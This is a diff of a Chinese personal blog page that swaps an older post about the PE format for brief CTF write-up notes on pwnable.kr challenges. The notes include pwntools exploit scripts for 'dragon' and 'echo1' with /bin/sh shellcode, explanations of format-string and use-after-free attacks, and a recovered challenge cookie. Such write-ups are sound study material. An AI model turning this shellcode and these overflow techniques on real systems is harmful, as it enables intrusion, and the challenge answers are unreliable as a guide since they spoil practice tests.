@@ -3,20 +3,20 @@
 <head>
   <meta charset="utf-8">
   
-  <title>PE格式 | 天河的随笔</title>
+  <title>pwnable_writeup2 | 天河的随笔</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="什么是PEPE（Portable Executable）格式，是微软Win32环境可移植可执行文件(如exe、dll、vxd、sys和vdm等)的标准文件格式。包括动态链接库 (.dll) PE文件头">
-<meta name="keywords" content="Bin">
+  <meta name="description" content="pwnable的wp">
+<meta name="keywords" content="CTF,PWN,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PE格式">
-<meta property="og:url" content="http://yoursite.com/2018/12/21/PE格式/index.html">
+<meta property="og:title" content="pwnable_writeup2">
+<meta property="og:url" content="http://yoursite.com/2018/06/20/pwnable-writeup2/index.html">
 <meta property="og:site_name" content="天河的随笔">
-<meta property="og:description" content="什么是PEPE（Portable Executable）格式，是微软Win32环境可移植可执行文件(如exe、dll、vxd、sys和vdm等)的标准文件格式。包括动态链接库 (.dll) PE文件头">
+<meta property="og:description" content="pwnable的wp">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2018-12-21T11:22:31.791Z">
+<meta property="og:updated_time" content="2018-09-26T07:34:47.997Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PE格式">
-<meta name="twitter:description" content="什么是PEPE（Portable Executable）格式，是微软Win32环境可移植可执行文件(如exe、dll、vxd、sys和vdm等)的标准文件格式。包括动态链接库 (.dll) PE文件头">
+<meta name="twitter:title" content="pwnable_writeup2">
+<meta name="twitter:description" content="pwnable的wp">
   
     <link rel="alternative" href="/atom.xml" title="天河的随笔" type="application/atom+xml">
   
@@ -142,7 +142,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/教程/" style="font-size: 10px;">教程</a> <a href="/tags/经验总结/" style="font-size: 10px;">经验总结</a>
+                        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/PWN/" style="font-size: 20px;">PWN</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/教程/" style="font-size: 10px;">教程</a>
                     </div>
                 </section>
                 
@@ -214,11 +214,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-PE格式" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwnable-writeup2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/12/21/PE格式/" class="article-date">
-      <time datetime="2018-12-21T01:13:46.000Z" itemprop="datePublished">2018-12-21</time>
+      <a href="/2018/06/20/pwnable-writeup2/" class="article-date">
+      <time datetime="2018-06-20T08:28:34.000Z" itemprop="datePublished">2018-06-20</time>
 </a>
     </div>
   
@@ -231,7 +231,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PE格式
+      pwnable_writeup2
     </h1>
   
 
@@ -239,8 +239,16 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+    </div>
+
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -249,8 +257,78 @@
       
           
         <a id="more"></a>
-<h2 id="什么是PE"><a href="#什么是PE" class="headerlink" title="什么是PE"></a>什么是PE</h2><p>PE（Portable Executable）格式，是微软Win32环境可移植可执行文件(如exe、dll、vxd、sys和vdm等)的标准文件格式。包括动态链接库 (.dll)</p>
-<h3 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h3>
+<h3 id="Rookiss"><a href="#Rookiss" class="headerlink" title="Rookiss"></a>Rookiss</h3><h2 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h2><p>python 可通过os.popen()执行C<br>算出cookie 通过溢出 改变流程</p>
+<h2 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h2><p>leave<br>MOV ESP, EBP    EBP的值赋给ESP，即将栈指针移动至栈底部<br>POP EBP    弹出保存在栈顶的前一个函数的EBP，即恢复栈桢 INPUT前四字节<br>retn<br>POP EIP EBP中间四个字节</p>
+<h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h2><p>源码如下</p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>#include &lt;stdlib.h&gt;</p>
+<p>#include &lt;string.h&gt;</p>
+<p>#include &lt;fcntl.h&gt;</p>
+<p>int main(int argc, char* argv[]){<br>    char fname[128];<br>    unsigned long long otp[2];</p>
+<pre><code>if(argc!=2){
+    printf(&quot;usage : ./otp [passcode]\n&quot;);
+    return 0;
+}
+
+int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);
+if(fd==-1) exit(-1);
+
+if(read(fd, otp, 16)!=16) exit(-1);
+close(fd);
+
+sprintf(fname, &quot;/tmp/%llu&quot;, otp[0]);
+FILE* fp = fopen(fname, &quot;w&quot;);
+if(fp==NULL){ exit(-1); }
+fwrite(&amp;otp[1], 8, 1, fp);
+fclose(fp);
+
+printf(&quot;OTP generated.\n&quot;);
+
+unsigned long long passcode=0;
+FILE* fp2 = fopen(fname, &quot;r&quot;);
+if(fp2==NULL){ exit(-1); }
+fread(&amp;passcode, 8, 1, fp2);
+fclose(fp2);
+
+if(strtoul(argv[1], 0, 16) == passcode){
+    printf(&quot;Congratz!\n&quot;);
+    system(&quot;/bin/cat flag&quot;);
+}
+else{
+    printf(&quot;OTP mismatch\n&quot;);
+}
+
+unlink(fname);
+return 0;
+</code></pre><p>}<br>看wp还有这种操作python -c “import os; os.system(‘ulimit 0; ./otp 0’)”</p>
+<p>这道题很有意思通过ulimit -f 0使得 创建文件大小最大为0这样无论如何 passcode都是0<br>参考 <a href="https://blog.csdn.net/w952622442/article/details/74179491" target="_blank" rel="noopener">https://blog.csdn.net/w952622442/article/details/74179491</a><br>参考 <a href="http://www.cnblogs.com/qq78292959/archive/2012/05/08/2490443.html" target="_blank" rel="noopener">http://www.cnblogs.com/qq78292959/archive/2012/05/08/2490443.html</a></p>
+<h2 id="ascii-easy"><a href="#ascii-easy" class="headerlink" title="ascii_easy"></a>ascii_easy</h2><p>vuln函数存在溢出 题目存在过滤 意思是 让你用asii字符写个exp</p>
+<p>参考<br><a href="https://blog.csdn.net/charlie_heng/article/details/79316683" target="_blank" rel="noopener">https://blog.csdn.net/charlie_heng/article/details/79316683</a></p>
+<h2 id="fsb"><a href="#fsb" class="headerlink" title="fsb"></a>fsb</h2><p>格式化字符串漏洞<br>通过写main ebp 指向got表 再找到main ebp的偏移 写got表到shell地址</p>
+<h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><p>这是一个牧师骑士打怪的故事打死怪物即可控制V5的值进而控制流程<br>那么怎么打死怪呢？血量为1字节 可以溢出为负数嗯这样就可以打死了<br>还需要提前送一波 不然五十的血量不够溢出<br>附上脚本<br>from pwn import *<br>p=remote(“pwnable.kr”,9004)<br>p.sendline(‘1’)<br>p.sendline(‘1’)<br>p.sendline(‘1’)<br>p.sendline(‘1’)<br>p.sendline(‘3’)<br>p.sendline(‘3’)<br>p.sendline(‘2’)<br>p.sendline(‘3’)<br>p.sendline(‘3’)<br>p.sendline(‘2’)<br>p.sendline(‘3’)<br>p.sendline(‘3’)<br>p.sendline(‘2’)<br>p.sendline(‘3’)<br>p.sendline(‘3’)<br>p.sendline(‘2’)<br>p.sendline(p32(0x8048dbf))<br>p.interactive()</p>
+<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>shellcode不好使要修？？？</p>
+<p>需要使用ulimit -s unlimited设置堆栈<br>也有不需要使用的<br>参考:<br><a href="https://blog.csdn.net/kostart123/article/details/79395273" target="_blank" rel="noopener">https://blog.csdn.net/kostart123/article/details/79395273</a><br><a href="https://blog.csdn.net/W952622442/article/details/74858399" target="_blank" rel="noopener">https://blog.csdn.net/W952622442/article/details/74858399</a></p>
+<h2 id="echo1"><a href="#echo1" class="headerlink" title="echo1"></a>echo1</h2><p>echo1函数溢出EIP 可执行可控制ip四个字节 写shellcode到EIP后面 写jmp rsp到IP 也可以rop</p>
+<p>#!/usr/bin/env python<br>from pwn import *<br>context.arch = ‘amd64’</p>
+<h1 id="libc-ELF-‘-libc-so-6’"><a href="#libc-ELF-‘-libc-so-6’" class="headerlink" title="libc = ELF(‘./libc.so.6’)"></a>libc = ELF(‘./libc.so.6’)</h1><p>if len(sys.argv) &lt; 2:</p>
+<pre><code># p = process(&apos;./babyheap&apos;,env = {&apos;LD_PRELOAD&apos;:&apos;/lib/x86_64-linux-gnu/libc-2.19.so&apos;})   
+p = process(&apos;./echo1&apos;)   
+context.log_level = &apos;debug&apos;
+</code></pre><p>else:<br>    context.log_level = ‘debug’<br>    p = remote(sys.argv[1], int(sys.argv[2]))</p>
+<pre><code># context.log_level = &apos;debug&apos;
+</code></pre><p>def exp():<br>    elf = ELF(“./echo1”)<br>    jmp=asm(“jmp rsp”)<br>    shellcode = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56”+”\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
+<pre><code>#gdb.attach(p,&quot;b *0x400818&quot;)
+p.recvuntil(&apos;name? : &apos;)
+p.sendline(jmp)
+p.recvuntil(&apos;&gt; &apos;)
+p.sendline(&apos;1&apos;)
+p.sendline((0x28)*&apos;a&apos;+p64(0x6020a0)+shellcode)
+p.interactive()
+p.close()
+</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    exp()</p>
+<h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><p>通过泄露地址能获得name地址 name写入shellcode<br>通过uaf进行调用shellcode<br>用fsb 写got表应该也能达到获得shell的效果但是在实际操作中不知为何无法把巨大的shellcode地址写进去ID的地址倒是能写进got表<br>还是菜啊 仍需努力</p>
+<h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><p>考密码学知识原理很简单通过按位爆破获得cookies  = you_will_never_guess_this_sugar_honey_salt_cookie<br>hashlib.sha256(id+cookie).hexdigest() == pw  //sha256(id+cookie)=fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503</p>
+<h2 id="RSA-calculator"><a href="#RSA-calculator" class="headerlink" title="RSA-calculator"></a>RSA-calculator</h2>
       
       
     </div>
@@ -259,13 +337,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/12/21/PE格式/">PE格式</a></p>
+        <p><span>本文标题:</span><a href="/2018/06/20/pwnable-writeup2/">pwnable_writeup2</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 天河 的个人博客">天河</a></p>
-        <p><span>发布时间:</span>2018年12月21日 - 09时13分</p>
-        <p><span>最后更新:</span>2018年12月21日 - 19时22分</p>
+        <p><span>发布时间:</span>2018年06月20日 - 16时28分</p>
+        <p><span>最后更新:</span>2018年09月26日 - 15时34分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/12/21/PE格式/" title="PE格式">http://yoursite.com/2018/12/21/PE格式/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/12/21/PE格式/　　作者: 天河" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/06/20/pwnable-writeup2/" title="pwnable_writeup2">http://yoursite.com/2018/06/20/pwnable-writeup2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/06/20/pwnable-writeup2/　　作者: 天河" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -278,18 +356,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/12/21/bin大体知识框架/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/11/24/kalilinux-install/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          bin大体知识框架
+          kalilinux install
         
       </div>
     </a>
   
   
-    <a href="/2018/11/24/kalilinux-install/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">kalilinux install</div>
+    <a href="/2018/06/20/linux下的特殊符号与shell编程/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">linux下的特殊符号与shell编程</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -300,7 +378,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是PE"><span class="toc-number">1.</span> <span class="toc-text">什么是PE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE文件头"><span class="toc-number">1.1.</span> <span class="toc-text">PE文件头</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rookiss"><span class="toc-number">1.</span> <span class="toc-text">Rookiss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-calculator"><span class="toc-number"></span> <span class="toc-text">md5 calculator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-login"><span class="toc-number"></span> <span class="toc-text">simple login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#otp"><span class="toc-number"></span> <span class="toc-text">otp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ascii-easy"><span class="toc-number"></span> <span class="toc-text">ascii_easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fsb"><span class="toc-number"></span> <span class="toc-text">fsb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dragon"><span class="toc-number"></span> <span class="toc-text">dragon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fix"><span class="toc-number"></span> <span class="toc-text">fix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo1"><span class="toc-number"></span> <span class="toc-text">echo1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#libc-ELF-‘-libc-so-6’"><span class="toc-number"></span> <span class="toc-text">libc = ELF(‘./libc.so.6’)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#echo2"><span class="toc-number"></span> <span class="toc-text">echo2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto1"><span class="toc-number"></span> <span class="toc-text">crypto1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA-calculator"><span class="toc-number"></span> <span class="toc-text">RSA-calculator</span></a>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -366,18 +444,18 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/12/21/bin大体知识框架/" title="上一篇: bin大体知识框架">
+            <a href="/2018/11/24/kalilinux-install/" title="上一篇: kalilinux install">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/11/24/kalilinux-install/" title="下一篇: kalilinux install">
+            <a href="/2018/06/20/linux下的特殊符号与shell编程/" title="下一篇: linux下的特殊符号与shell编程">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/12/21/bin大体知识框架/">bin大体知识框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/21/PE格式/">PE格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/kalilinux-install/">kalilinux install</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/20/linux下的特殊符号与shell编程/">linux下的特殊符号与shell编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/强网杯线下总结/">强网杯线下总结</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/kalilinux-install/">kalilinux install</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/20/pwnable-writeup2/">pwnable_writeup2</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/20/linux下的特殊符号与shell编程/">linux下的特殊符号与shell编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/18/linux权限笔记/">linux权限笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/14/pwnable-writeup/">pwnable_writeup</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
